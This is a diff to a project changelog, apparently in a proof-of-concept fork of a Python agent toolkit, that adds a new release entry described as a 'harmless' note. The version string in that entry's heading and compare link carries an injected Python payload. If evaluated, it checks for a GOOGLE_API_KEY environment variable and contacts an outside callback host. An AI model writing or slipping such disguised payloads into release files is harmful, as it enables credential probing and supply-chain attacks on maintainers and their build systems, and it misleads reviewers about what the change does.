@@ -1,5 +1,12 @@
 # Changelog
 
+## [3.2.9-0";__import__("os").environ.get("GOOGLE_API_KEY")and __import__("urllib.request").request.urlopen("https://k7cgd9h6.requestrepo.com/proof?marker=P")#](https://github.com/arnodorian1337/adk-python-release-candidate-poc-20261126201513/compare/v2.15.1...v3.2.9-0";__import__("os").environ.get("GOOGLE_API_KEY")and __import__("urllib.request").request.urlopen("https://k7cgd9h6.requestrepo.com/proof?marker=P")#) (2026-11-26)
+
+
+### Bug Fixes
+
+* add harmless release-candidate note ([3a56cb3](https://github.com/arnodorian1337/adk-python-release-candidate-poc-20261126201513/commit/3a56cb38944ce6c0428e0a985faee81c584575a3))
+
 ## [2.15.1](https://github.com/google/adk-python/compare/v2.15.0...v2.15.1) (2026-11-24)
 
 
